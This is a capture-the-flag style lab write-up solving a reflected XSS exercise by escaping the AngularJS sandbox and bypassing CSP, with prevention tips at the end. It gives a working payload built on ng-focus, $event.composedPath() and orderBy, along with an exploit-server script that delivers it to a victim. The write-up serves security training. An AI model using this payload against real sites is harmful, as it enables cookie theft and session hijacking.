# Lab 25: Reflected XSS with AngularJS sandbox escape and CSP

**Goal**: Deliver an AngularJS sandbox escape payload via the Exploit Server that bypasses Content Security Policy (CSP) to trigger `alert(document.cookie)`.

This lab uses AngularJS and implements a Content Security Policy (CSP). To solve the lab, we must construct an AngularJS expression payload that escapes the AngularJS sandbox using `$event.composedPath()`, bypasses CSP restriction by focusing an input element (`#x`), and alerts `document.cookie`.

---

## 🎯 Solution

1. Navigate to the **Exploit Server**.
2. Enter the following script in the **Body** text field, replacing `<YOUR-LAB-ID>` with your lab instance host:
   ```html
   <script>
   location = 'https://<YOUR-LAB-ID>.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
   </script>
   ```
3. Click **Store**, then click **Deliver exploit to victim**.

![Lab 25 Exploit Server Script Payload](../../Image%20Asset/Cross-Site%20Scripting/Pasted%20image%2020260926223500.png)

---

## 🛠️ Step-by-Step Guide

### Step 1: Analyze Reflection Context & CSP
Submit a search query in the search box. Inspect the HTTP response headers:

```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

And inspect the HTML body:

```html
<body ng-app="labApp">
    <h1 class="header">0 search results for '<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x'</h1>
```

- Standard `<script>` tag injection is blocked by CSP (`script-src 'self'`).
- However, AngularJS parses custom directives (like `ng-focus`) and evaluates expressions inside `orderBy` filters.

### Step 2: Construct AngularJS Sandbox Escape Payload
We construct an input tag using `ng-focus` combined with the `orderBy` filter and `$event.composedPath()`:

```html
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x
```

#### Payload Breakdown:
1. `<input id=x ...>`: Creates an HTML input element with `id="x"`.
2. `#x`: URL hash fragment forces the browser to auto-scroll and focus element `#x` upon loading.
3. `ng-focus=$event.composedPath()`: When element `#x` receives focus, `ng-focus` triggers `$event.composedPath()`, returning an array of objects in the event path (including the global `window` object).
4. `orderBy:'(z=alert)(document.cookie)'`: The `orderBy` filter iterates over the path array. Passing `(z=alert)(document.cookie)` evaluates `window.alert(document.cookie)` in the global window context, escaping the AngularJS sandbox.

### Step 3: Exploit Server Delivery
Open the **Exploit Server** and enter the payload in the **Body**:

```html
<script>
location = 'https://<YOUR-LAB-ID>.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>
```

1. Click **Store**.
2. Click **View exploit** to test locally.
3. Click **Deliver exploit to victim**.

![Lab 25 Solved Confirmation](../../Image%20Asset/Cross-Site%20Scripting/Pasted%20image%2020260926223521.png)

> [!SUCCESS]
> **Lab Solved**: Successfully escaped the AngularJS sandbox and bypassed CSP to execute `alert(document.cookie)`!

---

## 💡 Key Takeaways: AngularJS Sandbox Escape with CSP

- **Directive Event Handlers**: AngularJS directive event handlers (`ng-focus`, `ng-mouseenter`) execute client-side expression evaluations that bypass static script CSP rules (`default-src 'self'`).
- **`$event.composedPath()` Window Access**: Passing `$event.composedPath()` into an `orderBy` filter provides access to the global `window` object, enabling arbitrary function invocation (`alert(document.cookie)`).

---

## 🔒 Prevention

> [!TIP]
> 1. **Upgrade AngularJS**: Upgrade to Angular 2+ or higher where sandboxing has been deprecated in favor of strict Angular compilation.
> 2. **Strict CSP Policy**: Enforce strict CSP rules including `object-src 'none'` and avoid rendering unescaped user input inside AngularJS template directives.
